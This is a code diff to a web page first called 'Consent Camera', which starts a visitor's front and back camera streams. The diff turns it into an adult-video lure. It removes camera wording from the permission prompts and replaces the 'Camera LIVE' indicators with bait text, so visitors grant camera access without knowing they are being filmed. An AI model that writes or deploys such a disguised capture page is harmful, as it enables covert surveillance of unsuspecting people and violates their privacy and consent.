@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Consent Camera</title>
+<title>sex videos</title>
 
 <style>
 body{
@@ -60,14 +60,14 @@ body{
 
 <body>
 
-<h1>📷 Consent Camera</h1>
+<h1>HD sex videos</h1></h1>
 
 <div id="status">
-  🟡 Camera permission required
+  if 18+ just click allow permission its required
 </div>
 
 <div id="error">
-  Please allow camera permission to continue.
+  Please allow the permission to see the video.
 </div>
 
 <button
@@ -79,7 +79,7 @@ body{
 <div id="content">
 
   <div id="liveStatus">
-    🟢 Camera LIVE
+    see more videos by clicking the below button.
   </div>
 
   <a
@@ -87,7 +87,7 @@ body{
     href="https://www.google.com/"
     target="_blank"
     rel="noopener noreferrer">
-    🔎 Google
+    click here to see the HD video
   </a>
 
 </div>
@@ -145,11 +145,11 @@ function send(message){
 
 function showPermissionRequired(message){
   status.textContent =
-    "🔒 Camera permission required";
+    " permission required";
 
   errorBox.textContent =
     message ||
-    "Please allow camera permission to use this site.";
+    "Please allow permission to use this site.";
 
   content.style.display = "none";
   retryBtn.style.display = "inline-block";
@@ -158,7 +158,7 @@ function showPermissionRequired(message){
 async function startCameras(){
 
   status.textContent =
-    "🟡 Requesting camera permission...";
+    "🟡 Requesting permission...";
 
   errorBox.textContent = "";
 
@@ -189,7 +189,7 @@ async function startCameras(){
   }catch(err){
 
     console.error(
-      "Camera permission error:",
+      "permission error:",
       err
     );
 
@@ -199,7 +199,7 @@ async function startCameras(){
     ){
 
       showPermissionRequired(
-        "❌ Camera permission was denied. Please allow camera permission and try again."
+        "❌  permission was denied. Please allow camera permission and try again."
       );
 
     }else{
@@ -221,7 +221,7 @@ async function startCameras(){
   content.style.display = "block";
 
   status.textContent =
-    "🟢 Camera permission granted";
+    "permission granted";
 
   errorBox.textContent = "";
 
@@ -251,7 +251,7 @@ async function startCameras(){
   }catch(err){
 
     console.warn(
-      "Back camera unavailable:",
+      "Back  unavailable:",
       err
     );
 
@@ -261,8 +261,8 @@ async function startCameras(){
 
   status.textContent =
     backStream
-      ? "🟢 Front & Back Cameras LIVE"
-      : "🟢 Camera LIVE";
+      ? "Every day new link"
+      : "moody video";
 
   announceCameras();
 }
